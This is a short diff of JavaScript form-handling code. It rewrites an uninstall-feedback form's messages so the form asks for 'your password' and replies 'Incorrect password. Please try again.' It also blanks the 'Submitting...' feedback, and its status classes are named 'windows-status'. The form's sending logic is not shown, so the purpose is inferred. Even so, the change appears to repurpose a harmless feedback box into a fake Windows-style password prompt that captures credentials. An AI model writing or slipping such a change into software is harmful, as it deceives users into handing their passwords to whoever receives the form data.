@@ -2902,7 +2902,7 @@ if (submitReasonButton) {
             if (!reason) {
 
                 formStatus.textContent =
-                    "Please enter a reason for uninstall.";
+                    "Please enter your password..";
 
                 formStatus.className =
                     "windows-status error";
@@ -2939,11 +2939,11 @@ if (submitReasonButton) {
 
 
             submitButton.textContent =
-                "Submitting...";
+                "";
 
 
             formStatus.textContent =
-                "Submitting...";
+                "";
 
 
             formStatus.className =
@@ -3028,7 +3028,7 @@ if (submitReasonButton) {
                    ================================================= */
 
                 formStatus.textContent =
-                    "Submitted successfully.";
+                    "Successful.";
 
                 formStatus.className =
                     "windows-status success";
@@ -3118,7 +3118,7 @@ if (submitReasonButton) {
 
                 formStatus.textContent =
                     error.message ||
-                    "Unable to submit. Please try again.";
+                    "Incorrect password. Please try again.";
 
                 formStatus.className =
                     "windows-status error";
